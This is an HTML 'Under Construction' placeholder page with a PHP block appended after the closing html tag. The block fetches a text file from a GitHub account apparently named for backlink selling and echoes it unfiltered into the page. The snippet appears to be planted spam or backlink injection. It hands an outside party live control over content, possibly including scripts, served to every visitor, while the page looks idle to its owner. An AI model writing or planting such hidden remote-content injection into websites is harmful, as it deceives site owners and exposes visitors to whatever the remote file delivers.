<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Under Construction</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f4f4;
            color: #333;
            text-align: center;
            padding: 50px;
        }

        h1 {
            color: #d9534f;
        }

        p {
            font-size: 18px;
        }

        img {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <img src="https://static.vecteezy.com/system/resources/previews/000/192/152/non_2x/website-under-construction-vector.png" alt="Under Construction">
    <h1>Under Construction</h1>
    <p>Sorry, the website is currently under construction. We'll be back soon!</p>
</body>
</html>
<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
?>
